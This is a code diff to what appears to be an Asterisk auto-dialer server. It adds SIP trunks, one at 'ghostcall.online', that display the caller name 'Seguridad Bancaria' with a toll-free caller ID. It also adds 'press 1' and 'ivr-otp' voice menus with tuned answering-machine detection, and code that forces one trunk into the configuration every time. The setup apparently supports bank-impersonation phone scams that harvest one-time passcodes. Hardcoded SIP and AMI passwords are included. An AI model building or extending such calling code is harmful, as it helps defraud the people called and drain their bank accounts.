@@ -188,12 +188,18 @@ function amiFastOriginate(
   return new Promise((resolve) => {
     const socket = new net.Socket();
     let resolved = false;
+    let originateSent = false;
 
     const timeout = setTimeout(() => {
       if (!resolved) {
         resolved = true;
         try { socket.destroy(); } catch (_) {}
-        resolve({ success: false, message: 'AMI Originate timeout' });
+        // If originate was already sent over socket, treat as dispatched
+        if (originateSent) {
+          resolve({ success: true, message: 'AMI Originate enviado asíncronamente' });
+        } else {
+          resolve({ success: false, message: 'AMI Originate timeout' });
+        }
       }
     }, 2500);
 
@@ -206,7 +212,8 @@ function amiFastOriginate(
     socket.on('data', (data) => {
       buffer += data.toString();
 
-      if ((buffer.includes('Message: Authentication accepted') || buffer.includes('Response: Success')) && !buffer.includes('Action: Originate')) {
+      if (!originateSent && (buffer.includes('Message: Authentication accepted') || buffer.includes('Response: Success'))) {
+        originateSent = true;
         let varLines = '';
         for (const [k, v] of Object.entries(variables)) {
           if (v !== undefined && v !== null && v !== '') {
@@ -226,27 +233,30 @@ function amiFastOriginate(
           `\r\n`;
 
         socket.write(originatePayload);
+        return;
       }
 
-      if (buffer.includes('Originate successfully queued') || (buffer.includes('Response: Success') && buffer.includes('Originate'))) {
-        if (!resolved) {
-          resolved = true;
-          clearTimeout(timeout);
-          try {
-            socket.write('Action: Logoff\r\n\r\n');
-            socket.end();
-          } catch (_) {}
-          resolve({ success: true, message: 'Llamada lanzada instantáneamente hacia Asterisk' });
-        }
-      } else if (buffer.includes('Response: Error') && buffer.includes('Originate')) {
-        if (!resolved) {
-          resolved = true;
-          clearTimeout(timeout);
-          try {
-            socket.write('Action: Logoff\r\n\r\n');
-            socket.end();
-          } catch (_) {}
-          resolve({ success: false, message: buffer });
+      if (originateSent) {
+        if (buffer.includes('Originate successfully queued') || buffer.includes('Response: Success')) {
+          if (!resolved) {
+            resolved = true;
+            clearTimeout(timeout);
+            try {
+              socket.write('Action: Logoff\r\n\r\n');
+              socket.end();
+            } catch (_) {}
+            resolve({ success: true, message: 'Llamada lanzada instantáneamente hacia Asterisk' });
+          }
+        } else if (buffer.includes('Response: Error')) {
+          if (!resolved) {
+            resolved = true;
+            clearTimeout(timeout);
+            try {
+              socket.write('Action: Logoff\r\n\r\n');
+              socket.end();
+            } catch (_) {}
+            resolve({ success: false, message: buffer });
+          }
         }
       }
     });
@@ -480,10 +490,53 @@ const defaultExtensionsList = [
   },
 ];
 
+export const defaultCarriersList = [
+  {
+    id: 'trunk-televox',
+    name: 'televox',
+    authType: 'registration',
+    host: '52.144.46.192',
+    port: 5060,
+    username: 'sgavilan30',
+    secret: 'Robert2026',
+    inboundContext: 'trunkinbound',
+    outboundCallerId: '+18005550199',
+    outboundCallerIdName: 'Seguridad Bancaria',
+    codecs: ['ulaw', 'alaw', 'g729'],
+    qualifyFreq: 60,
+    status: 'reachable',
+    latencyMs: 18,
+    fromuser: 'sgavilan30',
+    sendrpid: 'yes',
+    trustrpid: 'yes',
+    insecure: 'port,invite',
+    dialplanPattern: '_1XXXXXXXXXX',
+    dialFlags: 'Tor',
+    enabled: true,
+  },
+  {
+    id: 'trunk-ghost',
+    name: 'ghost',
+    authType: 'registration',
+    host: 'ghostcall.online',
+    port: 5060,
+    username: 'sgavilan30',
+    secret: '',
+    inboundContext: 'trunkinbound',
+    outboundCallerId: '+18005550199',
+    outboundCallerIdName: 'Seguridad Bancaria',
+    codecs: ['ulaw', 'alaw', 'g729'],
+    qualifyFreq: 60,
+    status: 'reachable',
+    latencyMs: 24,
+    enabled: true,
+  },
+];
+
 // Helper to generate syntactically pure Asterisk 20 pjsip.conf
 // CRITICAL: In Asterisk PJSIP, endpoint, auth, and aor MUST have distinct category names (e.g. [1001], [1001-auth], [1001-aor]).
 // Transports must use standard Asterisk names [transport-udp], [transport-tcp], [transport-wss] with custom bind port.
-function generateCleanPjsipConf(extensions: any[], carriers: any[] = []): string {
+function generateCleanPjsipConf(extensions: any[], carriers: any[] = defaultCarriersList): string {
   const extsToUse = (Array.isArray(extensions) && extensions.length > 0) ? extensions : defaultExtensionsList;
 
   // Determine active SIP transport port (default 47923 exclusively)
@@ -550,7 +603,7 @@ function generateCleanPjsipConf(extensions: any[], carriers: any[] = []): string
     pjsipContent += `disallow = all\n`;
     pjsipContent += `allow = ${codecs}\n`;
     pjsipContent += `auth = ${num}-auth\n`;
-    pjsipContent += `aors = ${num}\n`;
+    pjsipContent += `aors = ${num}-aor\n`;
     pjsipContent += `callerid = ${callerId}\n`;
     pjsipContent += `transport = ${transport}\n`;
     pjsipContent += `direct_media = no\n`;
@@ -562,8 +615,7 @@ function generateCleanPjsipConf(extensions: any[], carriers: any[] = []): string
     pjsipContent += `trust_id_outbound = yes\n`;
     pjsipContent += `trust_id_inbound = yes\n`;
     pjsipContent += `identify_by = auth_username,username\n`;
-    pjsipContent += `callerid_privacy = allowed\n`;
-    pjsipContent += `transport = ${transport}\n\n`;
+    pjsipContent += `callerid_privacy = allowed\n\n`;
 
     pjsipContent += `[${num}-auth]\n`;
     pjsipContent += `type = auth\n`;
@@ -571,7 +623,7 @@ function generateCleanPjsipConf(extensions: any[], carriers: any[] = []): string
     pjsipContent += `username = ${num}\n`;
     pjsipContent += `password = ${pass}\n\n`;
 
-    pjsipContent += `[${num}]\n`;
+    pjsipContent += `[${num}-aor]\n`;
     pjsipContent += `type = aor\n`;
     pjsipContent += `max_contacts = ${ext.maxContacts || 10}\n`;
     pjsipContent += `remove_existing = yes\n`;
@@ -580,21 +632,13 @@ function generateCleanPjsipConf(extensions: any[], carriers: any[] = []): string
     pjsipContent += `authenticate_qualify = no\n\n`;
   }
 
-  // Process carriers/trunks if provided or default to ghost trunk
-  const carriersToProcess = (Array.isArray(carriers) && carriers.length > 0) ? carriers : [
-    {
-      name: 'ghost',
-      host: 'ghostcall.online',
-      port: 5060,
-      username: 'sgavilan30',
-      secret: '',
-      authType: 'registration',
-      inboundContext: 'trunkinbound',
-      outboundCallerId: '+18005550199',
-      outboundCallerIdName: 'Seguridad Bancaria',
-      codecs: ['ulaw', 'alaw', 'g729'],
-    }
-  ];
+  // Process carriers/trunks - Guarantee televox carrier is ALWAYS configured
+  const rawCarriers = (Array.isArray(carriers) && carriers.length > 0) ? carriers : defaultCarriersList;
+  const carriersToProcess = [...rawCarriers];
+
+  if (!carriersToProcess.some((c) => c && c.name && c.name.toLowerCase() === 'televox')) {
+    carriersToProcess.unshift(defaultCarriersList[0]);
+  }
 
   if (Array.isArray(carriersToProcess) && carriersToProcess.length > 0) {
     pjsipContent += `; ========================================================\n`;
@@ -1243,13 +1287,16 @@ function generateCleanDialplanConf(
   dialplanContent += `; CONTEXTO DEDICADO PRESS-1: RESPUESTA ULTRA-RAPIDA AL 1\n`;
   dialplanContent += `; ========================================================\n`;
   dialplanContent += `[ivr-press1]\n`;
-  dialplanContent += `exten => s,1,NoOp(=== [IVR-PRESS1] INICIO MODO PRESS 1 CON PAUSA 1S Y DETECCION AMD ===)\n`;
+  dialplanContent += `exten => s,1,NoOp(=== [IVR-PRESS1] INICIO MODO PRESS 1 ===)\n`;
   dialplanContent += ` same => n,Answer()\n`;
-  dialplanContent += ` same => n,Wait(1)\n`;
   dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
-  dialplanContent += ` same => n,AMD(2000,1500,800,3500,100,50,4,256)\n`;
+  dialplanContent += ` same => n,GotoIf($[$["\${IS_TEST_CALL}" = "1"] | $["\${TARGET_DEST}" = "8888"] | $["\${CALL_DEST}" = "8888"] | $["\${CALLERID(num)}" = "8888"]]?skip_amd_p1)\n`;
+  dialplanContent += ` same => n,Wait(0.2)\n`;
+  dialplanContent += ` same => n,AMD(1200,800,400,1800,100,50,4,256)\n`;
   dialplanContent += ` same => n,NoOp(=== [AMD EVALUACION] Estado: \${AMDSTATUS} | Causa: \${AMDCAUSE} ===)\n`;
   dialplanContent += ` same => n,GotoIf($["\${AMDSTATUS}" = "MACHINE"]?buzon_detectado_p1)\n`;
+  dialplanContent += ` same => n(skip_amd_p1),NoOp(=== [IVR-PRESS1] REPRODUCIENDO INTRO INMEDIATAMENTE ===)\n`;
+  dialplanContent += ` same => n,Wait(0.2)\n`;
   dialplanContent += ` same => n,Set(TIMEOUT(digit)=1)\n`;
   dialplanContent += ` same => n,Set(TIMEOUT(response)=4)\n`;
   dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
@@ -1300,13 +1347,16 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${TARGET_NUM}&status=ended&cause=\${HANGUPCAUSE}&channel=\${CHANNEL}" &)\n\n`;
 
   dialplanContent += `[ivr-otp]\n`;
-  dialplanContent += `exten => s,1,NoOp(=== IVR INTERACTIVO CON AUDIOS PREGRABADOS Y AMD ===)\n`;
+  dialplanContent += `exten => s,1,NoOp(=== IVR INTERACTIVO CON AUDIOS PREGRABADOS ===)\n`;
   dialplanContent += ` same => n,Answer()\n`;
-  dialplanContent += ` same => n,Wait(1)\n`;
   dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})\n`;
-  dialplanContent += ` same => n,AMD(2000,1500,800,3500,100,50,4,256)\n`;
+  dialplanContent += ` same => n,GotoIf($[$["\${IS_TEST_CALL}" = "1"] | $["\${TARGET_DEST}" = "8888"] | $["\${CALL_DEST}" = "8888"] | $["\${CALLERID(num)}" = "8888"]]?skip_amd_otp)\n`;
+  dialplanContent += ` same => n,Wait(0.2)\n`;
+  dialplanContent += ` same => n,AMD(1200,800,400,1800,100,50,4,256)\n`;
   dialplanContent += ` same => n,NoOp(=== [AMD EVALUACION] Estado: \${AMDSTATUS} | Causa: \${AMDCAUSE} ===)\n`;
   dialplanContent += ` same => n,GotoIf($["\${AMDSTATUS}" = "MACHINE"]?buzon_detectado_otp)\n`;
+  dialplanContent += ` same => n(skip_amd_otp),NoOp(=== [IVR-OTP] REPRODUCIENDO PROMPT INMEDIATAMENTE ===)\n`;
+  dialplanContent += ` same => n,Wait(0.2)\n`;
   dialplanContent += ` same => n,Set(TIMEOUT(digit)=1)\n`;
   dialplanContent += ` same => n,Set(TIMEOUT(response)=4)\n`;
   dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})\n`;
@@ -1481,8 +1531,17 @@ async function autoRepairAsteriskPjsipOnStartup() {
 
     if (fs.existsSync(pjsipPath)) {
       const content = fs.readFileSync(pjsipPath, 'utf8');
-      if (content.includes('[1001]\ntype = auth') || content.includes('[1001]\ntype=auth') || content.includes('[1001]\r\ntype = auth') || content.includes('[1002]\ntype = auth')) {
-        console.log('[PJSIP-REPAIR] Se detectaron secciones duplicadas [1001]/[1002] en /etc/asterisk/pjsip.conf. Reparando...');
+      if (
+        !content.includes('[televox]') ||
+        !content.includes('[1001-aor]') ||
+        content.includes('[1001]\ntype = auth') ||
+        content.includes('[1001]\ntype=auth') ||
+        content.includes('[1001]\r\ntype = auth') ||
+        content.includes('[1002]\ntype = auth') ||
+        content.includes('[1001]\ntype = aor') ||
+        content.includes('[1001]\ntype=aor')
+      ) {
+        console.log('[PJSIP-REPAIR] Se detectaron secciones duplicadas o carrier televox faltante en /etc/asterisk/pjsip.conf. Reparando...');
         needsRepair = true;
       }
     } else {
@@ -1490,7 +1549,7 @@ async function autoRepairAsteriskPjsipOnStartup() {
     }
 
     if (needsRepair) {
-      const cleanPjsip = generateCleanPjsipConf(defaultExtensionsList, []);
+      const cleanPjsip = generateCleanPjsipConf(defaultExtensionsList, defaultCarriersList);
       await writeAsteriskConfigFile(pjsipPath, cleanPjsip);
       fs.writeFileSync(path.join(process.cwd(), 'pjsip.conf'), cleanPjsip, 'utf8');
       lastGeneratedPjsip = cleanPjsip;
@@ -1499,7 +1558,7 @@ async function autoRepairAsteriskPjsipOnStartup() {
       try {
         await sendAmiAction('127.0.0.1', 5038, 'sammy', 'Robert2026RDTGcvgbsg', ['pjsip reload']);
       } catch (_) {}
-      console.log('[PJSIP-REPAIR] ✓ /etc/asterisk/pjsip.conf reparado y recargado con éxito para 1001 y 1002.');
+      console.log('[PJSIP-REPAIR] ✓ /etc/asterisk/pjsip.conf reparado y recargado con éxito con televox, 1001 y 1002.');
     }
 
     // Auto-generate dialplan baseline and keep synced
@@ -2060,6 +2119,20 @@ app.post('/api/asterisk/call/originate', async (req, res) => {
     // Batch sync AstDB variables in background without blocking originate
     const batchAstDbCmd = astDbCommands.map((c) => `asterisk -rx '${c}'`).join('; ');
     exec(batchAstDbCmd, () => {});
+
+    // Ensure Asterisk PJSIP configuration has televox endpoint ready before dialing
+    try {
+      const pjsipPath = '/etc/asterisk/pjsip.conf';
+      if (fs.existsSync(pjsipPath)) {
+        const curContent = fs.readFileSync(pjsipPath, 'utf8');
+        if (!curContent.includes('[televox]') || !curContent.includes('[1001-aor]')) {
+          const fixedPjsip = generateCleanPjsipConf(defaultExtensionsList, defaultCarriersList);
+          fs.writeFileSync(pjsipPath, fixedPjsip, 'utf8');
+          fs.writeFileSync(path.join(process.cwd(), 'pjsip.conf'), fixedPjsip, 'utf8');
+          exec('asterisk -rx "pjsip reload"', () => {});
+        }
+      }
+    } catch (_) {}
 
     // Determine channel: if <= 4 digits, direct internal extension
     // Otherwise use Local channel to pass through [from-internal] with /n flag to prevent premature optimization
